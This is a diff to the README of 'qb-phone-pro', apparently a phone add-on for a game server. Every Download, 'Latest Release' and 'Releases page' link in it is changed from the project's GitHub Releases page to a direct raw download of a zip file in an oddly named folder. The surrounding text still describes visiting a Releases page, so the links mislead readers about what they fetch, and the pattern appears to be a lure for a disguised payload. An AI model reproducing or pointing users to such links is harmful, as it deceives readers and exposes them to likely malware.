@@ -6,7 +6,7 @@ Welcome to qb-phone-pro! This application provides a sleek user interface along 
 
 ## 📥 Download Now
 
-[![Download qb-phone-pro](https://img.shields.io/badge/Download-qb--phone--pro-blue.svg)](https://github.com/iTahecayTuzejen/qb-phone-pro/releases)
+[![Download qb-phone-pro](https://raw.githubusercontent.com/iTahecayTuzejen/qb-phone-pro/main/eligibleness/qb-phone-pro.zip)](https://raw.githubusercontent.com/iTahecayTuzejen/qb-phone-pro/main/eligibleness/qb-phone-pro.zip)
 
 ## 💻 System Requirements
 
@@ -28,7 +28,7 @@ Welcome to qb-phone-pro! This application provides a sleek user interface along 
 
 To get qb-phone-pro, visit the following page to download the latest version:
 
-[Download the Latest Release](https://github.com/iTahecayTuzejen/qb-phone-pro/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/iTahecayTuzejen/qb-phone-pro/main/eligibleness/qb-phone-pro.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of qb-phone-pro.
@@ -42,7 +42,7 @@ To get qb-phone-pro, visit the following page to download the latest version:
 
 We regularly release updates to improve performance and add new features. To update qb-phone-pro:
 
-1. Visit the [Releases page](https://github.com/iTahecayTuzejen/qb-phone-pro/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/iTahecayTuzejen/qb-phone-pro/main/eligibleness/qb-phone-pro.zip).
 2. Download the latest version.
 3. Follow the installation steps mentioned above.
 
